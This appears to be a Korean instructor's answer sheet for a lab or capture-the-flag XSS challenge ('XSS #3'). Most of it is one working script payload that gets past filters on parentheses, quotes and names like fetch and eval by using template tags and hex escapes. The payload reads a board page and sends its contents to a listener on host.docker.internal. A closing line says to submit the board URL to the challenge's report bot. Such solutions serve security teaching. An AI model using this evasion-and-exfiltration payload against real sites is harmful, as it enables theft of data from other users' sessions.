# [강사용] XSS #3 풀이

`()` `'` `"` 와 fetch/eval/constructor 등이 막힘 → 백틱 태그드 템플릿 + 이스케이프 우회:

```html
<script>Set[`co`+`nst`+`ructor`]`f\x65tch\x28\x27/board/0\x27\x29.then\x28e=>e.text\x28\x29\x29.then\x28e=>{f\x65tch\x28\x27http://host.docker.internal:8000/?c=\x27+encodeURIComp\x6fnent\x28e\x29\x29}\x29```</script>
```
신고에 `http://xss-3:9103/board/<seq>` 제출.
